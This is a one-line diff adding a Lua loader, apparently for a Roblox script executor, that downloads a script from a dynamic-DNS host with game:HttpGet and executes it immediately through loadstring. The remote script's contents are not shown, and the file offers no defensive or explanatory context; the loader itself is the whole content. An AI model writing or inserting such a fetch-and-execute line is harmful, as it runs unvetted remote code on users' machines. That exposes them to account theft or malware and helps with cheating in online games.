@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://roblox.servegame.com/roblox_bss/chocmoc.lua"))()
